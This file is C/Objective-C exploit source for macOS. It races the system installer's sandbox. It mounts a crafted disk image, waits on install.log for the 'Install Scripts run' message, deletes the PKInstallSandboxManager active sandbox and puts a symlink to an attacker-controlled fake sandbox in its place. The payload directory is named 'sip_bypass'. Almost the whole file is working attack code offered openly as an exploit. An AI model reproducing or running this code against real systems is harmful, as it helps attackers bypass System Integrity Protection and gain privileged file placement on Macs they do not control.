#import <Foundation/Foundation.h>
#include <sys/stat.h>
#include <dirent.h>
#include <libgen.h>

#define MOUNT_DIR "/tmp/.exploit"
#define SBX_REPO MOUNT_DIR"/.PKInstallSandboxManager-SystemSoftware"

#define FAKE_SBX "/tmp/fakebox"
#define FAKE_ROOT_PAYLOAD FAKE_SBX"/Root/Library/Apple/sip_bypass"

void prepare(void) {
    printf("[*] preparing the payload...\n");
    system("mkdir -p "FAKE_ROOT_PAYLOAD);
    
    printf("[*] preparing the dmg mounting...\n");
    system("mkdir -p "MOUNT_DIR);
    system("hdiutil create -size 10m -volname .exploit -ov /tmp/disk.dmg");
    system("hdiutil attach /tmp/disk.dmg -mountpoint "MOUNT_DIR);
    
    symlink("/Library", MOUNT_DIR"/Library");
    
    printf("[*] all the preparations are done.\n");
}

void cleanup(void) {
    unlink("/tmp/disk.dmg");
    system("rm -rf "MOUNT_DIR);
}

void spin_for_log(const char *hint) {
    static const char *log_path = "/var/log/install.log";
    FILE *fp = NULL;
    char line[4096] = {0};
    
    fp = fopen(log_path, "r");
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fclose(fp);
    
    int found = 0;
    while (1) {
        fp = fopen(log_path, "r");
        fseek(fp, size, SEEK_SET);
        while (fgets(line, sizeof(line), fp) != NULL) {
            //printf("install.log: %s", line);
            if (strstr(line, hint)) {
                found = 1;
                break;
            }
        }
        size = ftell(fp);
        fclose(fp);
        
        if (found) {
            break;
        }
    }
}

// the payload to be shoved from the path:
// $MOUNT_DIR/.PKInstallSandboxManager-SystemSoftware/2C3F8603-0D00-4AF2-9F4D-BE51119859F8.activeSandbox/Root
void fire_the_hole(void) {
    DIR *dp = NULL;
    struct dirent *ep = NULL;
    char *sandbox = NULL;
    char path[MAXPATHLEN] = {0};
    
    while (1) {
        dp = opendir(SBX_REPO);
        if (NULL == dp) continue;
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 0x32) { //strlen("2C3F8603-0D00-4AF2-9F4D-BE51119859F8.activeSandbox")==0x32
                sandbox = ep->d_name;
                printf("[*] Got Sandbox:%s.\n", sandbox);
                goto NEXT1;
            }
        }
        closedir (dp);
    }
NEXT1:
    snprintf(path, MAXPATHLEN, SBX_REPO"/%s", sandbox);
    spin_for_log("1 Install Scripts run.");
    [[NSFileManager defaultManager]removeItemAtPath:[NSString stringWithUTF8String:path] error:0];
    symlink(FAKE_SBX, path);
    
    printf("[*] exploit successfully :D\n");
}

int main(int argc, const char * argv[]) {
    prepare();
    fire_the_hole();
    
    return 0;
}
